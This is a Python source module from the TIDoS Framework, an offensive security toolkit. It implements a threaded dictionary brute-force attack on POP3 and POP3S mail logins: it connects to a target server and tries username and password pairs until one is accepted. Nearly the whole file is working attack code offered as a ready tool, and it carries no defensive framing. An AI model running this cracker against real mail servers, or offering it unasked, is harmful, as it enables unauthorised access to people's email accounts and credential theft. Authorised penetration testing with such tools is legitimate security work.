#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of POP3 logins (POP3S auto-selected on port 995)."""

from __future__ import annotations

import poplib

from core.methods import brute
from core.methods.print import pbrute

info = "Brute force POP3 credentials using dictionaries (POP3S on port 995)."
searchinfo = "POP3 Login Cracker"
properties = brute.options(port_default=110, threads_default=4)


def _try_login(ip, port, user, password, timeout):
    use_ssl = int(port) == 995
    try:
        conn = (poplib.POP3_SSL(ip, port, timeout=timeout) if use_ssl
                else poplib.POP3(ip, port, timeout=timeout))
    except Exception as e:
        raise ConnectionError(str(e)) from e
    try:
        conn.user(user)
        conn.pass_(password)
        return True
    except poplib.error_proto:
        return False            # server returned -ERR for these credentials
    except Exception as e:
        raise ConnectionError(str(e)) from e
    finally:
        try:
            conn.quit()
        except Exception:
            try:
                conn.close()
            except Exception:
                pass


def attack(target):
    pbrute("POP3")
    return brute.run(target, properties, proto="pop", port_default=110,
              try_login=_try_login, lvl2="popbrute", threads_default=4,
              service="POP3")
